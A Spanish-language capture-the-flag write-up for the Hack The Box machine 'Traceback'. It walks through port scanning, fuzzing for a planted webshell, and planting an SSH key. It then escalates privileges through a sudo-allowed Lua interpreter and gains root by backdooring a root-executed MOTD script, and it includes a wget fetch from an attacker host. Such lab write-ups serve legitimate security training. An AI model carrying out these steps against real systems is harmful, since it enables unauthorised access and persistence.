# Traceback

## Escaneo
El primer paso es lanzar un escaneo de todos los puertos abiertos.

``` bash
$ nmap -p- --open -T5 10.10.10.181

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 13:57
Nmap scan report for 10.10.10.181
Host is up (0.049s latency).
Not shown: 41315 closed ports, 24218 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 21.35 seconds

```

Con el primer escaneo nos ha devuelto los puertos **22** y **80** abiertos. Ahora vamos a realizar un escaneo más completo de estos puertos.


``` bash
$ nmap -p22,80 -sC -sV 10.10.10.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 13:59 
Nmap scan report for 10.10.10.181
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.11 seconds

```

## User flag

Si nos conectamos al puerto 80 podemos ver la web. Si revisamos el código fuente de la web, nos fijamos en el comentario: *"Some of the best web shells that you might need"*.

``` html
<body>
	<center>
		<h1>This site has been owned</h1>
		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
		<h3> - Xh4H - </h3>
		<!--Some of the best web shells that you might need ;)-->
	</center>
</body>
</html>
```

Haciendo caso del comentario, nos ponemos a buscar el nombre de las webshells más utilizadas. Creamos una lista que la utilizaremos para realizar fuzzing.

``` bash
$ cat list1

angel.php
c100.php
c99.php
cyberwarrior.php
dq99.php
kacak.php
laund.aspx
netcat.php
r57.php
shell.aspx
shellupload
simattacker.php
tryag.php
uploadshell.php
zehir4.asp
README.md
alfa3.php
alfav3.0.1.php
andela.php
bloodsecv4.php
by.php
c99ud.php
cmd.php
configkillerionkros.php
jspshell.jsp
mini.php
obfuscated-punknopass.php
punk-nopass.php
punkholic.php
r57.php
smevk.php
wso2.8.5.php

```

Si ejecutamos el fuzzer **dirb** con la lista que hemos generado:

``` bash
$ dirb http://10.10.10.181/ ./list1

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Jun 26 13:03:39 2020
URL_BASE: http://10.10.10.181/
WORDLIST_FILES: ./list1

-----------------

GENERATED WORDS: 31

---- Scanning URL: http://10.10.10.181/ ----
+ http://10.10.10.181/smevk.php (CODE:200|SIZE:1261)
                                                                                                                                                                                                                                         
-----------------
END_TIME: Fri Jun 26 13:03:41 2020
DOWNLOADED: 31 - FOUND: 1

```

Si nos conectamos a la url http://10.10.10.181/smevk.php, encontramos que ya esta subida la webshell.
Para acceder utilizamos las credenciales por defecto, que las hemos encontrado en el propio php de un repositorio [github](https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php)

En la webshell podemos realizar muchas acciones, pero para trabajar mas cómodos nos vamos a subir una  key ssh.

```
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/segsalvaje/.ssh/id_rsa): id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:zOtQrmWldqu6iPjY22AV8FfLB/tFcjwtV/h+ZVmdYeo segsalvaje@kali
The key's randomart image is:
+---[RSA 3072]----+
|  .     o ..o. ==|
|   o   o + ++ *.o|
|    o . + . .= .o|
|     o o o ..  .+|
|    .   S o  E o.|
|   .   o +      o|
|  o   . B .     .|
| = + . B . .     |
|o.=.o +oo..      |
+----[SHA256]-----+

```
Una vez tenemos la keys generada, renombramos el fichero a **authorized_keys** para subirlo a la máquina, y que nos acepte nuestra private key.

```
$ cp id_rsa.pub authorized_keys

$ ls -l
.rw-r--r--  segsalvaje  segsalvaje  569 B   Wed Aug 19 18:54:48 2020    authorized_keys
.rw-------  segsalvaje  segsalvaje  2.5 KB  Wed Aug 19 18:53:39 2020    id_rsa
.rw-r--r--  segsalvaje  segsalvaje  569 B   Wed Aug 19 18:53:39 2020    id_rsa.pub

```

Ya tenemos acceso al servidor como usuario webadmin.

```
$ ssh -i id_rsa webadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Last login: Thu Feb 27 06:29:02 2020 from 10.10.14.3
webadmin@traceback:~$ 
```
En el directorio home de webadmin, nos encontramos una nota del usuario sysadmin:

``` bash
$ cat /home/webadmin/note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```
## Escalada de privilegios

Si analizamos los sudo que tiene el usuario webadmin. Vemos la utilidad que nos comenta sysadmin en el fichero note.txt.

```
$ sudo -ll
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:

Sudoers entry:
    RunAsUsers: sysadmin
    Options: !authenticate
    Commands:
        /home/sysadmin/luvit

```

Si nos creamos un pequeño script, para que nos abra una shell como sysadmin. Ya que al ejecutar el comando con sudo, nos abrirá la shell como sysadmin.

```
webadmin@traceback:~$ echo 'os.execute("/bin/bash")' > /home/webadmin/test.lua
webadmin@traceback:~$ cat /home/webadmin/test.lua
os.execute("/bin/bash")
```

Al ejecutar el script con sudo, nos abre un shell como usuario sysadmin, y ya podemos obtener la flag de user.

```
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit /home/webadmin/test.lua
sysadmin@traceback:~$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)

sysadmin@traceback:~$ cat /home/sysadmin/user.txt | cut -c1-20
9dca64fa7d95b9647b71

```

## Root flag

Cuando nos conectamos por **SSH** nos resulta curioso el mensaje que aparece. Buscaremos de forma recursiva el mensaje *"Welcome to Xh4H land"*.

```
sysadmin@traceback:~$ cd /
sysadmin@traceback:/$ grep -r -i "Welcome to Xh4H land" 2>/dev/null
etc/update-motd.d/00-header:echo "\nWelcome to Xh4H land \n"
var/backups/.update-motd.d/00-header:echo "\nWelcome to Xh4H land \n"

```

Lanzamos la utilidad *pspy64* para enumerar los procesos que están corriendo.
Primero nos descargamos el [pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64) y lo subimos a la máquina.

```
# Maquina atacante
$ python -m SimpleHTTPServer

#Maquina victima
sysadmin@traceback:/home/sysadmin$ wget http://TU_IP:8000/pspy64

```
Y lo ejecutamos.

```
$ sysadmin@traceback:/home/sysadmin$ ./pspy64 
2020/08/19 13:38:01 CMD: UID=0    PID=3895   | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 

```

Vemos que existe un proceso que copia los ficheros del directorio **/var/backups/.update-motd.d/** al directorio **/etc/update-motd.d/**.
El fichero *"00-header"* se ejecuta cada vez que nos conectamos por **SSH**. 
Lo que vamos hacer es que nos copie la key ssh del usuario webadmin al usuario root, de esta forma podremos acceder por SSH con la misma private key.

```
sysadmin@traceback:/$ echo "cp /home/webadmin/.ssh/authorized_keys /root/.ssh/" >> /etc/update-motd.d/00-header
sysadmin@traceback:/$ cat /etc/update-motd.d/00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
cp /home/webadmin/.ssh/authorized_keys /root/.ssh/

```
Realizamos una conexión por SSH para que ejecute el fichero *"00-header"*.

```
$ ssh -i id_rsa webadmin@10.10.10.181

```

Y ya podemos acceder con la clave por SSH al usuario root.

```
ssh -i id_rsa root@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Jan 24 03:43:29 2020
root@traceback:~# cat root.txt | cut -c1-20
695a5865b0314355ca08

```